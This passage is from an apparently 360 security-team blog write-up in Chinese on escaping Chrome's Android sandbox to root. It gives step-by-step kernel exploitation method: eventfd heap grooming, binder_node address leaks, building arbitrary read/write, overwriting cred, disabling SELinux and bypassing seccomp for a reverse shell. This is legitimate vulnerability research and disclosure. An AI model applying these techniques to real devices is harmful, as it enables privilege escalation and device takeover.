<h3><strong>Stable arbitrary read/write solution</strong></h3>



<p>基于上面这两种模型，我们可以使用ashmem来搭建一个任意地址读写方案。</p>



<p><strong>通过ashmem搭建任意地址读写模型</strong></p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210823002719021.png" alt="" class="wp-image-225" width="347" height="173" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210823002719021.png 694w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823002719021-300x149.png 300w" sizes="(max-width: 347px) 100vw, 347px"></figure></div>



<p>具体实现分为三步：</p>



<ul><li>泄露file1结构体地址</li></ul>



<ul><li>泄露file2结构体地址</li></ul>



<ul><li>同时还需要配合一次任意写，将private_data1字段内容修改为private_data2所在地址</li></ul>



<p>基于这个模型便可以通过调用上面提及的ashmem的读写系统调用来实现任意地址读写。但利用这枚漏洞来实现这个方案相对比较苛刻，是否还有更好的方案?答案依然是肯定的，这也是利用中采用的方案——仅通过一次漏洞触发就拿到了稳定任意地址读写元语。</p>



<p><strong>通过一次漏洞触发实现稳定任意值读写的方案</strong></p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210823002818548.png" alt="" class="wp-image-226" width="227" height="240" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210823002818548.png 454w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823002818548-284x300.png 284w" sizes="(max-width: 227px) 100vw, 227px"></figure></div>



<p>具体实现思路及其特点如下：</p>



<ul><li>通过内存布局<strong>使epitem的data字段和seq_file的buf字段重叠</strong></li><li>epitem与seqfile结构体大小都是 128字节，可以被分配到同一个页上</li><li>double-free后刚好可以构造出一个kfree(A+8)的场景</li><li>不需要预先泄露任何信息或配合地址写能力</li><li>搭建完成这套方案便具备了稳定的任意地址读写能力。在拥有这样的能力后，从某种意义上讲已经实现了提权。</li></ul>



<p>这个方案从原理上非常强大，但在实际实现时仍然会遇到一些问题。首先遇到的就是堆风水布局问题。</p>



<h2>Trouble when doing heap fengshui</h2>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210823002850740.png" alt="" class="wp-image-227" width="418" height="58" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210823002850740.png 836w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823002850740-300x41.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823002850740-768x106.png 768w" sizes="(max-width: 418px) 100vw, 418px"></figure></div>



<p>在调用系统调用来创建seq_file结构体时，从其业务逻辑实现上来看，会先分配一个op结构体，这两个结构体成对出现，在内存布局效果上来看如上所示。我们的基本思路是通过进一步的堆布局逐步将其分隔开，但找出这么一个合适的结构体并不容易。在深入探索之后，我们找到了一个eventfd相关的结构体。</p>



<p>该结构具备的特点可以完美的适用于这一场景：</p>



<ul><li>创建eventfd的系统调用可以在sandbox中访问</li><li>与eventfd相关联的结构体大小刚好为128字节</li><li>当关闭eventfd时对应的结构体也会同时被释放</li><li>按照特定的顺序创建和释放结构体便可以构造出如上的布局</li></ul>



<h2>Prepare holes with eventfd</h2>



<p>这样我们便可以先创建大量的eventfd来实现内存布局，假设其布局效果如下图上半部分。紧接着，关闭eventfd3，然后关闭eventfd1，其效果如图中下半部分。</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210823002911573.png" alt="" class="wp-image-243" width="494" height="151" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210823002911573.png 987w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823002911573-300x92.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823002911573-768x235.png 768w" sizes="(max-width: 494px) 100vw, 494px"></figure></div>



<p>之后打开/proc/self/comm，创建的op及seq_file将分配在已经预先隔开的slab上。再关闭eventfd2便可以在seq_file前留下一个闲置的slab对象。</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210823002940304.png" alt="" class="wp-image-229" width="476" height="176" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210823002940304.png 634w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823002940304-300x111.png 300w" sizes="(max-width: 476px) 100vw, 476px"></figure></div>



<h2>Build arbitrary read and write</h2>



<p>这个问题得到解决后，我们便可以基于该模型来构建任意地址读写方案。</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210823003049756.png" alt="" class="wp-image-230" width="420" height="169" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210823003049756.png 840w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823003049756-300x120.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823003049756-768x308.png 768w" sizes="(max-width: 420px) 100vw, 420px"></figure></div>



<p>具体步骤如下：</p>



<ul><li>堆喷大量的binder_node来填充这些空置slab对象</li><li>触发漏洞，使其释放kfree(C+8)</li><li>堆喷epitem来占用C+8位置</li></ul>



<h2>Leak kernel address</h2>



<p>在async_todo双向链表在初始化时候prev&amp;next指针会被初始化为自身地址。该binder_node结构体的prev指针地址会被残留在seq_file的头部，也即buf指针的位置，这意味着我们找到了一个信息泄露的起始点。</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210823003115276.png" alt="" class="wp-image-231" width="473" height="148" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210823003115276.png 946w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823003115276-300x94.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823003115276-768x239.png 768w" sizes="(max-width: 473px) 100vw, 473px"></figure></div>



<pre class="wp-block-code"><code class="hljs cpp">pwndbg&gt; pt/o <span class="hljs-keyword">struct</span> binder_node
<span class="hljs-comment">/* offset | size */</span> type = <span class="hljs-keyword">struct</span> binder_node {
<span class="hljs-comment">/* 0 | 4 */</span> <span class="hljs-keyword">int</span> debug_id;
<span class="hljs-comment">/* 4 | 4 */</span> <span class="hljs-keyword">spinlock_t</span> lock;
... skip ...
<span class="hljs-comment">/* 112 | 16 */</span> <span class="hljs-keyword">struct</span> list_head {
<span class="hljs-comment">/* 112 | 8 */</span> <span class="hljs-keyword">struct</span> list_head *next;
<span class="hljs-comment">/* 120 | 8 */</span> <span class="hljs-keyword">struct</span> list_head *prev;
<span class="hljs-comment">/* total size (bytes): 16 */</span>
} async_todo;    &lt;---------------- async_todo双向链表
<span class="hljs-comment">/* total size (bytes): 128 */</span>
}</code></pre>



<p>因为我们在堆上布局了大量的binder_node，所以我们第一步可以泄露出binder_node的内容，从中我们可以直接泄露出binder_proc的地址。接下来步骤就是用epitem把该binder_node替换掉，构建任意读原语。然后利用该原语，可以依次找到当前线程的task_struct，然后是其所属的task_group。有了task_group，就可以通过tid找到指定线程的task。沿着这个思路，我们可以获得需要的所有信息。自此之后，后续的提权成功只是流程和步骤多少的问题。</p>



<h2>Last step to get root ?</h2>



<p>在拥有了这种任意地址读写元语后，整个提权流程将变得非常简单，比较直接有效的办法还是攻击自主访问控制和强制访问控制。有了这个信息泄露的起点后，我们可以逐步拿到thread_info地址，将其修改为ROOT用户，修改cred，再关掉selinux_enforcing。这样是不是就可以成功提权了呢？上面提到沙箱进程中还有BPF机制的保护，还需要去关闭其BPF保护。</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210823003215314.png" alt="" class="wp-image-232" width="170" height="170" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210823003215314.png 340w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823003215314-300x300.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210823003215314-150x150.png 150w" sizes="(max-width: 170px) 100vw, 170px"></figure></div>



<h2>Last step to get root !</h2>



<p>Chrome的BPF过滤器过滤掉了大多数的系统调用，需要关掉BPF才能建立socket通信，实现反弹shell</p>



<ul><li>thread-&gt;seccomp-&gt;filter指向了所用的BPF规则，但该指针不能被直接置为空，相应的检测机制会触发kernel panic</li><li>BPF过滤规则通过链表组织，在我们的测试中，其一共有四项，我们将其设置为倒数第二项可以绕过系统调用限制，并能成功创建socket，实现反弹shell！</li></ul>



<h1>Demo</h1>



<p>下面链接是我们录制的一个攻击演示视频，该视频示范了利用该利用链可以在Pixel 4上安装任意应用。</p>



<p>链接：<a href="https://www.bilibili.com/video/BV1qg411L76y">https://www.bilibili.com/video/BV1qg411L76y</a></p>



<h1><strong>Conclusion</strong></h1>



<p>本文介绍了该条远程ROOT利用链沙箱逃逸提权部分，具体介绍了我们利用该漏洞在高度沙箱化的进程中攻击内核时遇到的各类问题，以及解决方法。文中介绍的仅一次触发漏洞就能实现稳定任意地址读写的方案非常强大，但该方案对结构体大小的依赖比较大，其中用到的seq_file及binder_node结构体，其大小在差异较大的系统版本上可能会有所变化，这些变化可能会导致利用方案的失败，但基于该模型可能找到一些其他的替代方案。目前该利用方案还是需要适配selinux_enforcing符号地址，这也留下了一个问题，这一步在拥有了稳定的内核地址读写元语后能不能自动化完成?</p>



<p>安卓系统在内外多重推力下其安全性得到了不断的加强，各类防护机制被不断引入，谷歌多次提高其漏洞奖励计划奖励额度，体现其对自身产品安全性的信心。但绝对安全只是我们的愿景，现实却非常残酷。文中介绍的漏洞利用方案，在极为苛刻的条件下，采用极为简单的方案实现了仅触发一次漏洞就获得了稳定的任意地址读写元语，使得系统现有的各类防护变得脆弱不堪，其中一次触发漏洞也达到了理论极限。防护更多的是考虑一个面，而攻击却可以仅找一个点，攻防对抗也将在这个过程不断博弈，不断发展。</p>



<p>最后，在这里要感谢团队小伙伴龚广、姚俊、张弛在这条利用链中所提供的帮助。他们提出了许多宝贵的建议，给了我们诸多启发，感谢他们！</p>

			<div class="wbp-cbm" style="--dwqrColor: #00B64B;" wb-share-url="https://vul.360.net/?p=217"><div class="dwqr-inner"><a class="wb-btn-dwqr wb-btn-like j-dwqr-like-btn" data-count="37" rel="nofollow"><svg class="wb-icon wbsico-like"><use xlink:href="#wbsico-dwqr-like"></use></svg><span class="like-count">赞(37)</span></a><a class="wb-btn-dwqr wb-share-poster j-dwqr-poster-btn" rel="nofollow"><svg class="wb-icon wbsico-poster"><use xlink:href="#wbsico-dwqr-poster"></use></svg><span>微海报</span></a><a class="wb-btn-dwqr wb-btn-share j-dwqr-social-btn" rel="nofollow"><svg class="wb-icon wbsico-share"><use xlink:href="#wbsico-dwqr-share"></use></svg><span>分享</span></a></div></div>        </div>
        <section class="view-tag">
            <div class="pull-left"><i class="fas fa-tags"></i> <a href="https://vul.360.net/archives/tag/%e5%86%85%e6%a0%b8%e5%ae%89%e5%85%a8" rel="tag">内核安全</a><a href="https://vul.360.net/archives/tag/%e6%b5%8f%e8%a7%88%e5%99%a8%e5%ae%89%e5%85%a8" rel="tag">浏览器安全</a></div>
        </section>
            </article>
    <section class="col-md-10 col-md-offset-1 clearfix">
    <div class="read">
        <div class="read-head"><i class="fas fa-book"></i> 更多阅读</div>
        <div class="read-list row">
            <div class="col-md-6">
                <ul>
                    
<li><a href="https://vul.360.net/archives/263" target="_blank">Internal of the Android kernel backdoor vulnerability</a></li>
<li><a href="https://vul.360.net/archives/83" target="_blank">Windows Pool OverFlow漏洞利用</a></li>
<li><a href="https://vul.360.net/archives/95" target="_blank">Passwordless WinRm Backdoor Based On Certification</a></li>
<li><a href="https://vul.360.net/archives/144" target="_blank">Exploiting the Promise.allsettled bug in V8</a></li>
<li><a href="https://vul.360.net/archives/217" target="_blank">Escape from chrome sandbox to root</a></li>                </ul>
            </div>
            <div class="col-md-6">
                <ul>
                                    <li><a href="https://vul.360.net/archives/263" title="Internal of the Android kernel backdoor vulnerability">Internal of the Android kernel backdoor vulnerability</a></li>
                                    <li><a href="https://vul.360.net/archives/95" title="Passwordless WinRm Backdoor Based On Certification">Passwordless WinRm Backdoor Based On Certification</a></li>
                                    <li><a href="https://vul.360.net/archives/144" title="Exploiting the Promise.allsettled bug in V8">Exploiting the Promise.allsettled bug in V8</a></li>
                                    <li><a href="https://vul.360.net/archives/83" title="Windows Pool OverFlow漏洞利用">Windows Pool OverFlow漏洞利用</a></li>
                                    <li><a href="https://vul.360.net/archives/217" title="Escape from chrome sandbox to root">Escape from chrome sandbox to root</a></li>
                                </ul>
            </div>
        </div>
    </div>
    <div class="read">
        <div class="read-head"><i class="fas fa-tags"></i> 标签云</div>
        <div class="read-list">
            <a href="https://vul.360.net/archives/tag/windows" class="tag-cloud-link tag-link-17 tag-link-position-1" style="color:#85f063;font-size: 22pt;" aria-label="Windows (2 items);">Windows</a>
<a href="https://vul.360.net/archives/tag/%e5%86%85%e6%a0%b8" class="tag-cloud-link tag-link-18 tag-link-position-2" style="color:#a4b5eb;font-size: 8pt;" aria-label="内核 (1 item);">内核</a>
<a href="https://vul.360.net/archives/tag/%e5%86%85%e6%a0%b8%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-24 tag-link-position-3" style="color:#876b7d;font-size: 8pt;" aria-label="内核安全 (1 item);">内核安全</a>
<a href="https://vul.360.net/archives/tag/%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-19 tag-link-position-4" style="color:#9ff84b;font-size: 22pt;" aria-label="安全 (2 items);">安全</a>
<a href="https://vul.360.net/archives/tag/%e6%b5%8f%e8%a7%88%e5%99%a8%e5%ae%89%e5%85%a8" class="tag-cloud-link tag-link-23 tag-link-position-5" style="color:#d1e2e7;font-size: 22pt;" aria-label="浏览器安全 (2 items);">浏览器安全</a>
<a href="https://vul.360.net/archives/tag/%e6%b8%97%e9%80%8f" class="tag-cloud-link tag-link-7 tag-link-position-6" style="color:#4c972;font-size: 8pt;" aria-label="渗透 (1 item);">渗透</a>
<a href="https://vul.360.net/archives/tag/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="tag-cloud-link tag-link-22 tag-link-position-7" style="color:#4d2c92;font-size: 22pt;" aria-label="漏洞分析 (2 items);">漏洞分析</a>
<a href="https://vul.360.net/archives/tag/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="tag-cloud-link tag-link-16 tag-link-position-8" style="color:#4c8d10;font-size: 22pt;" aria-label="漏洞利用 (2 items);">漏洞利用</a>        </div>
    </div>
    </section>
</div>
<div class="footer_search visible-xs visible-sm">
    <form id="searchform" action="https://vul.360.net/">
        <div class="input-group">
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<input type="search" class="form-control" placeholder="输入关键词搜索…" value="" name="s">
            <span class="input-group-btn" style="vertical-align:bottom !important"><button class="btn btn-default" type="submit"><i class="fas fa-search"></i></button></span>
        </div>
    </form>
</div>
<footer id="footer">
    <div class="copyright">
        <p><i class="far fa-copyright"></i> 2021 <b>京ICP备20015286号-8</b></p>
        <p><a href="https://beian.miit.gov.cn/" target="_blank" rel="nofollow"> </a> <a href="http://www.beian.gov.cn/" target="_blank" rel="nofollow">京公网安备 11010502041971号</a></p>
    </div>
            <div style="display:none;"> </div>
    </footer>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/jquery.min.js.下載"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/bootstrap.min.js.下載"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/skel.min.js.下載"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/util.min.js.下載"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/nav.js.下載"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/comment-reply.min.js.下載" id="comment-reply-js"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/highlight.pack.js.下載" id="pure-highlightjs-pack-js"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/wbui.js.下載" id="wbui-js-js"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/jquery.min.js(1).下載" id="jquery-core-js"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/jquery-migrate.min.js.下載" id="jquery-migrate-js"></script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/qrious.min.js.下載" id="qrious-js-js"></script>
<script type="text/javascript" id="wbs-front-dwqr-js-before">
var dwqr_opt="1.4.5|https%3A%2F%2Fvul.360.net%2Fwp-content%2Fplugins%2Fdonate-with-qrcode%2F|0|https%3A%2F%2Fvul.360.net%2Fwp-admin%2Fadmin-ajax.php|217"; var assets_ver=window.assets_ver || "1.4.5";
var poster_theme=2, poster_ratio="3:2";var wb_dwqr_share_html='<div class="wb-share-list" data-cover="https://vul.360.net/wp-content/uploads/2021/08/image-20210824181959950-1024x342.png"><a class="share-logo icon-weixin" data-cmd="weixin" title="分享到微信" rel="nofollow"><svg class="wb-icon wbsico-dwqr-weixin"><use xlink:href="#wbsico-dwqr-weixin"></use></svg></a><a class="share-logo icon-weibo" data-cmd="weibo" title="分享到微博" rel="nofollow"><svg class="wb-icon wbsico-dwqr-weibo"><use xlink:href="#wbsico-dwqr-weibo"></use></svg></a><a class="share-logo icon-qzone" data-cmd="qzone" title="分享到QQ空间" rel="nofollow"><svg class="wb-icon wbsico-dwqr-qzone"><use xlink:href="#wbsico-dwqr-qzone"></use></svg></a><a class="share-logo icon-qq" data-cmd="qq" title="分享到QQ" rel="nofollow"><svg class="wb-icon wbsico-dwqr-qq"><use xlink:href="#wbsico-dwqr-qq"></use></svg></a>';
</script>
<script type="text/javascript" src="./2021 - Escape from chrome sandbox to root_files/wbp_front.js.下載" id="wbs-front-dwqr-js"></script>
<script>
$(function() {
    $('[data-toggle="tooltip"]').tooltip()
});
</script>


<div id="titleBar"><a href="https://vul.360.net/archives/217#header" class="toggle"></a><span class="title"><img style="width: 150px;" src="./2021 - Escape from chrome sandbox to root_files/mobile-icon.png"></span></div></body></html>